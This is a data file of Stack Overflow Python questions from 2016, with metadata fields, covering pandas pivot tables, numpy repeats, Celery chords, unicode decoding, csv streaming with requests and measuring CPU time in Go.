39605839,6593015.0,2016-09-21 00:43:56+00:00,6,Double loop takes time,"<p>I have a script which takes a lot of time and can't finish so far after 2 days...
I parsed 1 file into 2 dictionaries as the following:</p>

<pre><code>gfftree = {'chr1':[(gene_id, gstart, gend),...], 'chr2':[(gene_id, gstart, gend),...],...}
TElocation = {'chr1':[(TE_id, TEstart, TEend),...], 'chr2':[(TE_id, TEstart, TEend),...],...}
</code></pre>

<p>.</p>

<p>--The aim is to find TE_id whose TEstart or TEend or both are located between gene_id' gstart and gend in each chr(key).</p>

<h1>The above should be changed to ""find TE_id whose range(TEstart, TEend) overlaps with any gene_id's range(gstart,gend)""</h1>

<p>Here is my code:</p>

<pre><code>TE_in_TSS = []
for TErange in TElocation[chromosome]:
    TE_id, TEstart, TEend = TErange
    for item in gfftree[chromosome]:
        gene, gstart, gend = item       
        if len(list(set(range(int(gstart),int(gend)+1)) &amp; set(range(int(TEstart),int(TEend)+1)))) &gt; 0:
            TE_in_TSS.append((gene, TE_id, TEstart, TEend))
        else:
            pass
</code></pre>

<p>So far I'm sure this loop is fine with small data, but when it comes to bigger one like 800,000 TE_id and 4,000 gene_id, it takes time...and I don't know if it could finish...</p>
"
39602004,5976692.0,2016-09-20 19:07:50+00:00,6,Can I use pandas.dataframe.isin() with a numeric tolerance parameter?,"<p>I reviewed the following posts beforehand. Is there a way to use DataFrame.isin() with an approximation factor or a tolerance value? Or is there another method that could?</p>

<p><a href=""http://stackoverflow.com/questions/12065885/how-to-filter-the-dataframe-rows-of-pandas-by-within-in"">How to filter the DataFrame rows of pandas by &quot;within&quot;/&quot;in&quot;?</a></p>

<p><a href=""http://stackoverflow.com/questions/12096252/use-a-list-of-values-to-select-rows-from-a-pandas-dataframe"">use a list of values to select rows from a pandas dataframe</a></p>

<p>EX)</p>

<pre><code>df = DataFrame({'A' : [5,6,3.3,4], 'B' : [1,2,3.2, 5]})

In : df
Out:
   A    B
0  5    1
1  6    2
2  3.3  3.2
3  4    5  

df[df['A'].isin([3, 6], tol=.5)]

In : df
Out:
   A    B
1  6    2
2  3.3  3.2
</code></pre>
"
39885770,3814425.0,2016-10-06 00:40:44+00:00,6,Most efficient way to determine overlapping timeseries in Python,"<p>I am trying to determine what percentage of the time that two time series overlap using python's pandas library. The data is nonsynchronous so the times for each data point do not line up. Here is an example:</p>

<p><strong>Time Series 1</strong></p>

<pre><code>2016-10-05 11:50:02.000734    0.50
2016-10-05 11:50:03.000033    0.25
2016-10-05 11:50:10.000479    0.50
2016-10-05 11:50:15.000234    0.25
2016-10-05 11:50:37.000199    0.50
2016-10-05 11:50:49.000401    0.50
2016-10-05 11:50:51.000362    0.25
2016-10-05 11:50:53.000424    0.75
2016-10-05 11:50:53.000982    0.25
2016-10-05 11:50:58.000606    0.75
</code></pre>

<p><strong>Time Series 2</strong></p>

<pre><code>2016-10-05 11:50:07.000537    0.50
2016-10-05 11:50:11.000994    0.50
2016-10-05 11:50:19.000181    0.50
2016-10-05 11:50:35.000578    0.50
2016-10-05 11:50:46.000761    0.50
2016-10-05 11:50:49.000295    0.75
2016-10-05 11:50:51.000835    0.75
2016-10-05 11:50:55.000792    0.25
2016-10-05 11:50:55.000904    0.75
2016-10-05 11:50:57.000444    0.75
</code></pre>

<p>Assuming the series holds its value until the next change what is the most efficient way to determine the percentage of time that they have the same value? </p>

<p><strong>Example</strong></p>

<p>Lets calculate the time that these series overlap starting at 11:50:07.000537 and ending at 2016-10-05 11:50:57.000444    0.75 since we have data for both series for that period. Time that there is overlap:</p>

<ul>
<li>11:50:10.000479 - 11:50:15.000234 (both have a value of 0.5) <strong>4.999755 seconds</strong></li>
<li>11:50:37.000199 - 11:50:49.000295 (both have a value of 0.5) <strong>12.000096 seconds</strong></li>
<li>11:50:53.000424 - 11:50:53.000982 (both have a value of 0.75) <strong>0.000558 seconds</strong></li>
<li>11:50:55.000792 - 11:50:55.000904 (both have a value of 0.25) <strong>0.000112 seconds</strong></li>
</ul>

<p>The result (4.999755+12.000096+0.000558+0.000112) / 49.999907 = <strong>34%</strong></p>

<p>One of the issues is my actual timeseries has much more data such as 1000 - 10000 observations and I need to run many more pairs. I thought about forward filling a series and then simply comparing the rows and dividing the total number of matches over the total number of rows but I do not think this would be very efficient.</p>
"
40061280,1080804.0,2016-10-15 16:06:41+00:00,6,Why can yield be indexed?,"<p>I thought I could make my python (2.7.10) code simpler by directly accessing the index of a value passed to a generator via <code>send</code>, and was surprised the code ran. I then discovered an index applied to <code>yield</code> doesn't really do anything, nor does it throw an exception:</p>

<pre><code>def gen1():
    t = yield[0]
    assert t
    yield False

g = gen1()
next(g)
g.send('char_str')
</code></pre>

<p>However, if I try to index <code>yield</code> thrice or more, I get an exception:</p>

<pre><code>def gen1():
    t = yield[0][0][0]
    assert t
    yield False

g = gen1()
next(g)
g.send('char_str')
</code></pre>

<p>which throws</p>

<pre><code>TypeError: 'int' object has no attribute '__getitem__'
</code></pre>

<p>This was unusually inconsistent behavior, and I was wondering if there is an intuitive explanation for what indexing yield is actually doing?</p>
"
39978405,7001260.0,2016-10-11 13:29:13+00:00,5,String encode/decode issue - missing character from end,"<p>I am having <code>NVARCHAR</code> type column in my database. I am unable to convert the content of this column to plain string in my code. (I am using <code>pyodbc</code> for the database connection).</p>

<pre><code># This unicode string is returned by the database
&gt;&gt;&gt; my_string = u'\u4157\u4347\u6e65\u6574\u2d72\u3430\u3931\u3530\u3731\u3539\u3533\u3631\u3630\u3530\u3330\u322d\u3130\u3036\u3036\u3135\u3432\u3538\u2d37\u3134\u3039\u352d'

# prints something in chineese 
&gt;&gt;&gt; print my_string
ääæ¹¥æ´âµ²ã°ã¤±ã°ã±ã¹ã³ã±ã°ã°ã°ã­ã°ã¶ã¶ãµã²ã¸â´·ã´ã¹ã­
</code></pre>

<p>The closest I have gone is via encoding it to <code>utf-16</code> as:</p>

<pre><code>&gt;&gt;&gt; my_string.encode('utf-16')
'\xff\xfeWAGCenter-04190517953516060503-20160605124857-4190-5'
&gt;&gt;&gt; print my_string.encode('utf-16')
ï¿½ï¿½WAGCenter-04190517953516060503-20160605124857-4190-5
</code></pre>

<p>But the actual value that I need as per the value store in database is:</p>

<pre><code>WAGCenter-04190517953516060503-20160605124857-4190-51
</code></pre>

<p>I tried with encoding it to <code>utf-8</code>, <code>utf-16</code>, <code>ascii</code>, <code>utf-32</code> but nothing seemed to work.</p>

<p>Does anyone have the idea regarding what I am missing? And how to get the desired result from the <code>my_string</code>.</p>

<p><strong>Edit</strong>: <em>On converting it to <code>utf-16-le</code>, I am able to remove unwanted characters from start, but still one character is missing from end</em></p>

<pre><code>&gt;&gt;&gt; print t.encode('utf-16-le')
WAGCenter-04190517953516060503-20160605124857-4190-5
</code></pre>

<p><em>On trying for some other columns, it is working. <strong>What might be the cause of this intermittent issue?</em></strong></p>
"
39816433,,2016-10-02 11:17:57+00:00,5,Complex workflow on Celery,"<p>I am trying to build a workflow basing on Celery. I use groups and chords.</p>

<p>In the example below there are independent groups ([mytask1, mytask1, mytask1, ..] -> myfinaltask1) where <code>mytask1</code> might be executed in parallel, but <code>myfinaltask1</code> should be called after each group.</p>

<p>Code:</p>

<pre><code>def func1(date):
    subtasks = []
    for filepath in all_files:
        kwargs = {'date': date, 'hfile': filepath}
        subtask = mytask1.subtask(kwargs=kwargs)
        subtasks.append(subtask)

    chrd = chord(subtasks)
    chrdr = chrd(myfinaltask1.s(kwargs={'date': date}))
    return chrdr


def main(all_dates):
    subtasks = []
    for ad in all_dates:
        subtasks.append(func1(ad))

    g = group(subtasks)
    gr = g.apply_async()
    results = gr.get(propagate=False)  # sync wait!


main([2014, 2015, 2016])
</code></pre>

<p>Exception thrown:</p>

<pre><code>File ""/mypath/get_evi.py"", line 265, in get_evi_year
    gr = g.apply_async()
File ""/opt/venv/lib/python3.5/site-packages/celery/canvas.py"", line 502, in apply_async
    type = self.type
File ""/opt/venv/lib/python3.5/site-packages/celery/canvas.py"", line 569, in type
    return self.app.tasks[self['task']]
File ""/opt/venv/lib/python3.5/site-packages/celery/canvas.py"", line 560, in app
    return self._app or (self.tasks[0].app if self.tasks else current_app)
AttributeError: 'bool' object has no attribute 'app'
</code></pre>

<p>What do I do wrong?</p>
"
40065479,3150181.0,2016-10-16 00:01:25+00:00,5,Numpy repeat for 2d array,"<p>Given two arrays, say </p>

<pre><code>arr = array([10, 24, 24, 24,  1, 21,  1, 21,  0,  0], dtype=int32)
rep = array([3, 2, 2, 0, 0, 0, 0, 0, 0, 0], dtype=int32)
</code></pre>

<p>np.repeat(arr, rep) returns </p>

<pre><code>array([10, 10, 10, 24, 24, 24, 24], dtype=int32)
</code></pre>

<p>Is there any way to replicate this functionality for a set of 2D arrays?</p>

<p>That is given </p>

<pre><code>arr = array([[10, 24, 24, 24,  1, 21,  1, 21,  0,  0],
            [10, 24, 24,  1, 21,  1, 21, 32,  0,  0]], dtype=int32)
rep = array([[3, 2, 2, 0, 0, 0, 0, 0, 0, 0],
            [2, 2, 2, 0, 0, 0, 0, 0, 0, 0]], dtype=int32)
</code></pre>

<p>is it possible to create a function which vectorizes?</p>

<p>PS: The number of repeats in each row need not be the same. I'm padding each result row to ensure that they are of same size.</p>

<pre><code>def repeat2d(arr, rep):
    # Find the max length of repetitions in all the rows. 
    max_len = rep.sum(axis=-1).max()  
    # Create a common array to hold all results. Since each repeated array will have 
    # different sizes, some of them are padded with zero.
    ret_val = np.empty((arr.shape[0], maxlen))  
    for i in range(arr.shape[0]):
        # Repeated array will not have same num of cols as ret_val.
        temp = np.repeat(arr[i], rep[i])
        ret_val[i,:temp.size] = temp
    return ret_val 
</code></pre>

<p>I do know about np.vectorize and I know that it does not give any performance benefits over the normal version.</p>
"
39891202,975987.0,2016-10-06 08:29:28+00:00,5,How to send raw string to a dotmatrix printer using python in ubuntu?,"<p>I have a dot-matrix printer LX-300 connected to my computer through the network. How do I send a raw string with ESCP characters directly to my printer in Python?</p>

<p>The computer is connected to the printer through another computer. I need to send a raw string because LX-300 image printing result is blurry.</p>
"
39988589,4596596.0,2016-10-12 00:06:20+00:00,5,"How to pass through a list of queries to a pandas dataframe, and output the list of results?","<p>When selecting rows whose column value <code>column_name</code> equals a scalar, <code>some_value</code>, we use <code>==:</code></p>

<pre><code>df.loc[df['column_name'] == some_value]
</code></pre>

<p>or use <code>.query()</code> </p>

<pre><code>df.query('column_name == some_value')
</code></pre>

<p>In a concrete example:</p>

<pre><code>import pandas as pd
import numpy as np
df = pd.DataFrame({'Col1': 'what are men to rocks and mountains'.split(),
                   'Col2': 'the curves of your lips rewrite history.'.split(),
                   'Col3': np.arange(7),
                   'Col4': np.arange(7) * 8})

print(df)

         Col1      Col2  Col3  Col4
0       what       the     0     0
1        are    curves     1     8
2        men        of     2    16
3         to      your     3    24
4      rocks      lips     4    32
5        and   rewrite     5    40
6  mountains  history      6    48
</code></pre>

<p>A query could be</p>

<pre><code>rocks_row = df.loc[df['Col1'] == ""rocks""]
</code></pre>

<p>which outputs</p>

<pre><code>print(rocks_row)
    Col1  Col2  Col3  Col4
4  rocks  lips     4    32
</code></pre>

<p>I would like to pass through a list of values to query against a dataframe, which outputs a list of ""correct queries"". </p>

<p>The queries to execute would be in a list, e.g.</p>

<pre><code>list_match = ['men', 'curves', 'history']
</code></pre>

<p>which would output all rows which meet this condition, i.e. </p>

<pre><code>matches = pd.concat([df1, df2, df3]) 
</code></pre>

<p>where </p>

<pre><code>df1 = df.loc[df['Col1'] == ""men""]

df2 = df.loc[df['Col1'] == ""curves""]

df3 = df.loc[df['Col1'] == ""history""]
</code></pre>

<p>My idea would be to create a function that takes in a </p>

<pre><code>output = []
def find_queries(dataframe, column, value, output):
    for scalar in value: 
        query = dataframe.loc[dataframe[column] == scalar]]
        output.append(query)    # append all query results to a list
    return pd.concat(output)    # return concatenated list of dataframes
</code></pre>

<p>However, this appears to be exceptionally slow, and doesn't actually take advantage of the pandas data structure. What is the ""standard"" way to pass through a list of queries through a pandas dataframe? </p>

<p>EDIT: How does this translate into ""more complex"" queries in pandas? e.g. <code>where</code> with an HDF5 document? </p>

<pre><code>df.to_hdf('test.h5','df',mode='w',format='table',data_columns=['A','B'])

pd.read_hdf('test.h5','df')

pd.read_hdf('test.h5','df',where='A=[""foo"",""bar""] &amp; B=1')
</code></pre>
"
39631995,6284629.0,2016-09-22 06:42:41+00:00,5,qt5 (and python) - How to get the default thumbnail size of user's os,"<p>I am looking to create an image browser that shows nicely and evenly tiled thumbnails, on a native looking file browser.</p>

<p>On windows, I'm hoping it would look something similar to this:</p>

<p><a href=""http://i.stack.imgur.com/AXWKd.jpg"" rel=""nofollow""><img src=""http://i.stack.imgur.com/AXWKd.jpg"" alt=""enter image description here""></a></p>

<p>On ubuntu, I'm hoping it would look something similar to this:</p>

<p><a href=""http://i.stack.imgur.com/0K4mb.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/0K4mb.png"" alt=""enter image description here""></a></p>

<p>But this is what's available right now:</p>

<p><a href=""http://i.stack.imgur.com/I0GBm.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/I0GBm.png"" alt=""thumbnail sized are different from default size""></a></p>

<p>One of the issues I'm facing involves specifying the correct thumbnail size for the images. I understand that I can set the thumbnail size programatically by using the code <code>self.setIconSize(QSize(32, 32))</code>, however, setting the thumbnail size this way may result in sizes inconsistent with the system default, making it look unnatural. </p>

<p><strong>So my question is:</strong> How do I get the ""default thumbnail size"" that is set on the user's desktop, to make my thumbnail appearance consistent with the user's os (using qt5 or more specifically PySide2 or PyQt5)?</p>

<p>Here's the code I'm working with so far:
`</p>

<pre><code>import sys
from PySide2.QtCore import QSize
from PySide2.QtGui import QIcon
from PySide2.QtWidgets import QApplication, QListWidget, QListWidgetItem, QMainWindow

class ThumbsWindow(QListWidget):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.initUI()

    def initUI(self):
        self.setViewMode(QListWidget.IconMode)
        self.setIconSize(QSize(32, 32))

        myimage_path = ""./images/web.png""
        myimage_path1 = ""./images/image1.jpg""
        myimage_path2 = ""./images/image2.jpg""
        myimage_path3 = ""./images/image3.jpg""

        image_list = [myimage_path, myimage_path1, myimage_path2, myimage_path3]
        # create a list of QIcons
        image_items = [QListWidgetItem(QIcon(path_x), ""sample image"") for path_x in image_list]

        # add each of the QIcons onto the QListWidget
        for image_item in image_items:
            self.addItem(image_item)


class Example(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        t = ThumbsWindow()
        self.setCentralWidget(t)

        self.resize(400, 300)
        self.setWindowTitle('Image Thumbnails')
        self.show()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = Example()
    sys.exit(app.exec_())
</code></pre>

<p>`</p>
"
40016359,1934212.0,2016-10-13 08:50:17+00:00,5,Index the first and the last n elements of a list,"<p>the first n and the last n element of the python list</p>

<pre><code>l=[1,2,3,4,5,6,7,8,9,10]
</code></pre>

<p>can be indexed by the expressions</p>

<pre><code>print l[:3]
[1, 2, 3]
</code></pre>

<p>and</p>

<pre><code>print l[-3:]
[8, 9, 10]
</code></pre>

<p>is there a way to combine both in a single expression, i.e index the first n and the last n elements using one indexing expression?</p>
"
39941393,266185.0,2016-10-09 08:04:49+00:00,5,python: loop a list of list and assign value inside the loop,"<p>I have the following code, why the first one doesn't change <code>alist</code> while the second changes it?</p>

<pre><code>alist = [[1,2], [3,4], [5,6]]
for item in alist:
    item = 1
print(alist)

alist = [[1,2], [3,4], [5,6]]
for item in alist:
    item = item.append(10)
print(alist)
</code></pre>
"
40134664,6007834.0,2016-10-19 14:43:04+00:00,5,problems dealing with pandas read csv,"<p>I've got a problem with pandas read_csv. I had a many txt files that associate with stock market.It's like this:</p>

<pre><code>SecCode,SecName,Tdate,Ttime,LastClose,OP,CP,Tq,Tm,Tt,Cq,Cm,Ct,HiP,LoP,SYL1,SYL2,Rf1,Rf2,bs,s5,s4,s3,s2,s1,b1,b2,b3,b4,b5,sv5,sv4,sv3,sv2,sv1,bv1,bv2,bv3,bv4,bv5,bsratio,spd,rpd,depth1,depth2  
600000,æµ¦åé¶è¡,20120104,091501,8.490,.000,.000,0,.000,0,0,.000,0,.000,.000,.000,.000,.000,.000, ,.000,.000,.000,.000,8.600,8.600,.000,.000,.000,.000,0,0,0,0,1100,1100,38900,0,0,0,.00,.000,.00,.00,.00
600000,æµ¦åé¶è¡,20120104,091506,8.490,.000,.000,0,.000,0,0,.000,0,.000,.000,.000,.000,.000,.000, ,.000,.000,.000,.000,8.520,8.520,.000,.000,.000,.000,0,0,0,0,56795,56795,33605,0,0,0,.00,.000,.00,.00,.00
600000,æµ¦åé¶è¡,20120104,091511,8.490,.000,.000,0,.000,0,0,.000,0,.000,.000,.000,.000,.000,.000, ,.000,.000,.000,.000,8.520,8.520,.000,.000,.000,.000,0,0,0,0,56795,56795,34605,0,0,0,.00,.000,.00,.00,.00
600000,æµ¦åé¶è¡,20120104,091551,8.490,.000,.000,0,.000,0,0,.000,0,.000,.000,.000,.000,.000,.000, ,.000,.000,.000,.000,8.520,8.520,.000,.000,.000,.000,0,0,0,0,56795,56795,35205,0,0,0,.00,.000,.00,.00,.00
600000,æµ¦åé¶è¡,20120104,091621,8.490,.000,.000,0,.000,0,0,.000,0,.000,.000,.000,.000,.000,.000, ,.000,.000,.000,.000,8.520,8.520,.000,.000,.000,.000,0,0,0,0,57795,57795,34205,0,0,0,.00,.000,.00,.00,.00
</code></pre>

<p>while I use this code to read it :</p>

<pre><code>fields = ['SecCode', 'Tdate','Ttime','LastClose','OP','CP','Rf1','Rf2']  
df = pd.read_csv('SHL1_TAQ_600000_201201.txt',usecols=fields)
</code></pre>

<p>But I got a problem: </p>

<pre><code>Traceback (most recent call last):
  File ""E:/workspace/Senti/highlevel/highlevel.py"", line 8, in &lt;module&gt;
    df = pd.read_csv('SHL1_TAQ_600000_201201.txt',usecols=fields,header=1)
  File ""D:\Anaconda2\lib\site-packages\pandas\io\parsers.py"", line 562, in parser_f
    return _read(filepath_or_buffer, kwds)
  File ""D:\Anaconda2\lib\site-packages\pandas\io\parsers.py"", line 315, in _read
    parser = TextFileReader(filepath_or_buffer, **kwds)
  File ""D:\Anaconda2\lib\site-packages\pandas\io\parsers.py"", line 645, in __init__
    self._make_engine(self.engine)
  File ""D:\Anaconda2\lib\site-packages\pandas\io\parsers.py"", line 799, in _make_engine
    self._engine = CParserWrapper(self.f, **self.options)
  File ""D:\Anaconda2\lib\site-packages\pandas\io\parsers.py"", line 1257, in __init__
    raise ValueError(""Usecols do not match names."")
ValueError: Usecols do not match names.
</code></pre>

<p>I can't find any problem similar to mine.And also it's wired when I copy the txt file into another one ,the code runs well,but the original one cause the above problem.How can I solve it ?</p>
"
40135459,3971528.0,2016-10-19 15:15:38+00:00,5,Reading a text file using Pandas where some rows have empty elements?,"<p>I have a dataset in a textfile that looks like this.</p>

<pre><code>    0    0CF00400 X       8  66  7D  91  6E  22  03  0F  7D       0.021650 R
    0    18EA0080 X       3  E9  FE  00                           0.022550 R
    0    00000003 X       8  D5  64  22  E1  FF  FF  FF  F0       0.023120 R
</code></pre>

<p>I read this using</p>

<pre><code>file_pandas = pd.read_csv(fileName, delim_whitespace = True, header = None, engine = 'python')
</code></pre>

<p>And got the output</p>

<pre><code>    0   0  0CF00400  X   8  66  7D  91        6E  22    03    0F    7D  0.02165   
    1   0  18EA0080  X   3  E9  FE   0  0.022550   R  None  None  None      NaN   
    2   0  00000003  X   8  D5  64  22        E1  FF    FF    FF    F0  0.02312   
</code></pre>

<p>But I want this read as</p>

<pre><code>    0   0  0CF00400  X   8  66  7D  91        6E  22    03    0F    7D  0.021650   R  
    1   0  18EA0080  X   3  E9  FE  00                                  0.022550   R
    2   0  00000003  X   8  D5  64  22        E1  FF    FF    FF    F0  0.023120   R
</code></pre>

<p>I've tried removing <code>delim_whitespace = True</code> and replacing it with <code>delimiter = ""  ""</code> but that just combined the first four columns in the output shown above, but it did parse the rest of the data correctly, meaning that the rest of the columns were like the origin txt file (barring the NaN values in whitespaces).</p>

<p>I'm not sure how to proceed from here. </p>

<p>Side note: the <code>00</code> is being parsed as only <code>0</code>. Is there a way to display <code>00</code> instead?</p>
"
39957761,183704.0,2016-10-10 11:57:52+00:00,5,Order of elements from minidom getElementsByTagName,"<p>Is the order for returned elements from Mindom <code>getElementsByTagName</code> the same as it is in document for elements in the same hierarchy / level?</p>

<pre><code>    images = svg_doc.getElementsByTagName('image') 
    image_siblings = []
    for img in images:
        if img.parentNode.getAttribute('layertype') == 'transfer':
            if img.nextSibling is not None:
                if img.nextSibling.nodeName == 'image':
                    image_siblings.append(img.nextSibling)
                elif img.nextSibling.nextSibling is not None and img.nextSibling.nextSibling.nodeName == 'image':
                    image_siblings.append(img.nextSibling.nextSibling)
</code></pre>

<p>I need to know if <code>image_siblings</code> will contain the images in the same order, they are placed in the document for the same hierarchy.</p>

<p>I found a similar <a href=""https://stackoverflow.com/questions/4954003/order-of-the-elements-returned-using-getelementsbytagname"">question</a> for JavaScript, but I'm unsure if this is also true for Python (version 3.5.2) Minidom <code>getElementsByTagName</code>.</p>
"
40090522,1642513.0,2016-10-17 15:40:08+00:00,5,Pandas: How to conditionally assign multiple columns?,"<p>I want to replace negative values with <code>nan</code> for only certain columns. The simplest way could be:</p>

<pre><code>for col in ['a', 'b', 'c']:
    df.loc[df[col ] &lt; 0, col] = np.nan
</code></pre>

<p><code>df</code> could have many columns and I only want to do this to specific columns. </p>

<p>Is there a way to do this in one line? Seems like this should be easy but I have not been able to figure out.</p>
"
39955336,3021888.0,2016-10-10 09:35:19+00:00,5,Pandas pivot table: columns order and subtotals,"<p>I'm using Pandas 0.19.</p>

<p>Considering the following data frame:</p>

<pre><code>FID  admin0  admin1  admin2  windspeed  population
0    cntry1  state1  city1   60km/h     700
1    cntry1  state1  city1   90km/h     210
2    cntry1  state1  city2   60km/h     100
3    cntry1  state2  city3   60km/h     70
4    cntry1  state2  city4   60km/h     180
5    cntry1  state2  city4   90km/h     370
6    cntry2  state3  city5   60km/h     890
7    cntry2  state3  city6   60km/h     120
8    cntry2  state3  city6   90km/h     420
9    cntry2  state3  city6   120km/h    360
10   cntry2  state4  city7   60km/h     740
</code></pre>

<p>How can I create a table like this one?</p>

<pre><code>                                population
                         60km/h  90km/h  120km/h
admin0  admin1  admin2  
cntry1  state1  city1    700     210      0
cntry1  state1  city2    100     0        0
cntry1  state2  city3    70      0        0
cntry1  state2  city4    180     370      0
cntry2  state3  city5    890     0        0
cntry2  state3  city6    120     420      360
cntry2  state4  city7    740     0        0
</code></pre>

<p>I have tried with the following pivot table:</p>

<pre><code>table = pd.pivot_table(df,index=[""admin0"",""admin1"",""admin2""], columns=[""windspeed""], values=[""population""],fill_value=0)
</code></pre>

<p>In general it works great, but unfortunately I am not able to sort the new columns in the right order: the 120km/h column appears before the ones for 60km/h and 90km/h. How can I specify the order of the new columns?</p>

<p>Moreover, as a second step I need to add subtotals both for admin0 and admin1. Ideally, the table I need should be like this:</p>

<pre><code>                                population
                         60km/h  90km/h  120km/h
admin0  admin1  admin2  
cntry1  state1  city1    700     210      0
cntry1  state1  city2    100     0        0
        SUM state1       800     210      0
cntry1  state2  city3    70      0        0
cntry1  state2  city4    180     370      0
        SUM state2       250     370      0
SUM cntry1               1050    580      0
cntry2  state3  city5    890     0        0
cntry2  state3  city6    120     420      360
        SUM state3       1010    420      360
cntry2  state4  city7    740     0        0
        SUM state4       740     0        0
SUM cntry2               1750    420      360
SUM ALL                  2800    1000    360
</code></pre>
"
39710365,674039.0,2016-09-26 18:59:25+00:00,5,How to convert unicode numbers to ints?,"<blockquote>
  <p>Arabic and Chinese have their own glyphs for digits.  <code>int</code> works correctly with all the different ways to write numbers.</p>
</blockquote>

<p>I was not able to reproduce the behaviour (python 3.5.0)</p>

<pre><code>&gt;&gt;&gt; from unicodedata import name
&gt;&gt;&gt; name('í í¹¤')
'RUMI DIGIT FIVE'
&gt;&gt;&gt; int('í í¹¤')
ValueError: invalid literal for int() with base 10: 'í í¹¤'
&gt;&gt;&gt; int('äº')  # chinese/japanese number five
ValueError: invalid literal for int() with base 10: 'äº'
</code></pre>

<p>Am I doing something wrong?  Or is the claim simply incorrect (<a href=""http://www.jjinux.com/2012/03/pycon-advanced-python-tutorials.html"" rel=""nofollow"">source</a>).  </p>
"
40003067,2505645.0,2016-10-12 15:55:31+00:00,5,"Why does __slots__ = ('__dict__',) produce smaller instances?","<pre><code>class Spam(object):
    __slots__ = ('__dict__',)
</code></pre>

<p>Produces instances smaller than those of a ""normal"" class. Why is this?</p>

<p>Source: <a href=""https://twitter.com/dabeaz/status/785948782219231232"" rel=""nofollow"">David Beazley's recent tweet</a>.  </p>
"
40108070,4151472.0,2016-10-18 12:18:41+00:00,5,How to get read/write disk speed in Python?,"<p>In a Pyhton program I need to get the accumulated read/write speeds of all disks on the host. I was doing it with <code>subprocess.check_output()</code> to call the following Linux shell command:</p>

<pre><code>$ sudo hdparm -t /dev/sda
</code></pre>

<p>This gives as a result:</p>

<pre><code>/dev/sda:
 Timing buffered disk reads: 1488 MB in  3.00 seconds = 495.55 MB/sec
</code></pre>

<p>then I can parse the 495.55. OK, so far so good.</p>

<p>But on the man page of <code>hdparm</code> i found this explanation for the <code>-t</code> flag that basically says that when performing measurements no other process should read/write to disk at same time:</p>

<blockquote>
  <p>Perform  timings  of  device  reads  for benchmark and comparison purposes. For meaningful results, this operation should be repeated 2-3 times on an otherwise inactive system (no other active processes) with at least a couple of megabytes of free memory.  This displays the speed of reading through the buffer cache to the disk without any prior caching  of  data. This measurement  is  an indication of how fast the drive can sustain sequential data reads under Linux, without any filesystem overhead. To ensure accurate measurements, the buffer cache is flushed during the processing of -t using the BLKFLSBUF ioctl.</p>
</blockquote>

<p><strong>The question is</strong>:</p>

<p>How can I ensure that no other process is accessing disk at the same time when measurements are performed?</p>
"
39998424,2423139.0,2016-10-12 12:17:51+00:00,5,How to delete a file without an extension?,"<p>I have made a function for deleting files:</p>

<pre><code>def deleteFile(deleteFile):
    if os.path.isfile(deleteFile):
        os.remove(deleteFile)
</code></pre>

<p>However, when passing a FIFO-filename (without file-extension), this is not accepted by the os-module.
Specifically I have a subprocess create a FIFO-file named 'Testpipe'.
When calling:</p>

<pre><code>os.path.isfile('Testpipe')
</code></pre>

<p>It results to <code>False</code>. The file is not in use/open or anything like that. Python runs under Linux.</p>

<p>How can you correctly delete a file like that?</p>
"
39657173,476.0,2016-09-23 09:22:17+00:00,5,distutils/setuptools egg_info -b swallows leading zeros,"<p>I have noticed an odd behaviour of setuptools/distutils (I'm not even sure which of the two this functionality belongs to):</p>

<pre><code>$ ./setup.py egg_info -b 0613001 sdist
</code></pre>

<p>The above command generates this file:</p>

<pre><code>dist/Foo-2.0.dev613001.tar.gz
</code></pre>

<p>Notice the missing leading <code>0</code> in the file name. This only seems to happen with pure numbers, as if Python casts the value to an <code>int</code> if and when possible.</p>

<p>This randomly broke part of my build scripts which generate packages based on the git revision and expect the same identifier later. The simple fix is to prefix it with a string, e.g. <code>r0613001</code>.</p>

<p>Setuptools version is currently 21.0.0.</p>

<p>Is this a bug which should be reported? If so, where to?</p>
"
40076534,1107049.0,2016-10-16 23:15:38+00:00,5,How to drop duplicate from DataFrame taking into account value of another column,"<p>When I drop <code>John</code> as duplicate specifying 'name' as the column name: </p>

<pre><code>import pandas as pd   
data = {'name':['Bill','Steve','John','John','John'], 'age':[21,28,22,30,29]}
df = pd.DataFrame(data)
df = df.drop_duplicates('name')
</code></pre>

<p>pandas drops all matching entities leaving the left-most:</p>

<pre><code>   age   name
0   21   Bill
1   28  Steve
2   22   John
</code></pre>

<p>Instead I would like to keep the row where John's age is the highest (in this example it is the age 30. How to achieve this?</p>
"
39619676,2466146.0,2016-09-21 14:39:44+00:00,5,"csv.reader read from Requests stream: iterator should return strings, not bytes","<p>I'm trying to stream response to <code>csv.reader</code> using <code>requests.get(url, stream=True)</code>  to handle quite big data feeds. My code worked fine with <code>python2.7</code>. Here's code:</p>

<pre><code>response = requests.get(url, stream=True)
ret = csv.reader(response.iter_lines(decode_unicode=True), delimiter=delimiter, quotechar=quotechar,
    dialect=csv.excel_tab)
for line in ret:
    line.get('name')
</code></pre>

<p>Unfortunately after migration to python3.6 I got an following error: </p>

<pre><code>_csv.Error: iterator should return strings, not bytes (did you open the file in text mode?)
</code></pre>

<p>I was trying to find some wrapper/decorator that would covert result of <code>response.iter_lines()</code> iterator from bytes to string, but no luck with that.
I already tried to use <code>io</code> package and also <code>codecs</code>. Using <code>codecs.iterdecode</code> doesn't split data in lines, it's just split probably by <code>chunk_size</code>,
and in this case <code>csv.reader</code> is complaining in following way:</p>

<pre><code>_csv.Error: new-line character seen in unquoted field - do you need to open the file in universal-newline mode?
</code></pre>
"
40063269,1661689.0,2016-10-15 19:21:07+00:00,5,How can I ensure that a function takes a certain amount of time in Go?,"<p>I am implementing EnScrypt for an SQRL client in Go. The function needs to run until it has used a minimum amount of CPU time. My Python code looks like this:</p>

<pre><code>def enscrypt_time(salt, password, seconds, n=9, r=256):
    N = 1 &lt;&lt; n
    start = time.process_time()
    end = start + seconds
    data = acc = scrypt.hash(password, salt, N, r, 1, 32)
    i = 1
    while time.process_time() &lt; end:
        data = scrypt.hash(password, data, N, r, 1, 32)
        acc = xor_bytes(acc, data)
        i += 1
    return i, time.process_time() - start, acc
</code></pre>

<p>Converting this to Go is pretty simple except for the <code>process_time</code> function.
I can't use <code>time.Time</code> / <code>Timer</code> because those measure wall-clock time (which is affected by everything else that may be running on the system). I need the CPU time actually used, ideally by the function, or at least by the thread or process it is running in.</p>

<p>What is the Go equivalent of <code>process_time</code>?</p>

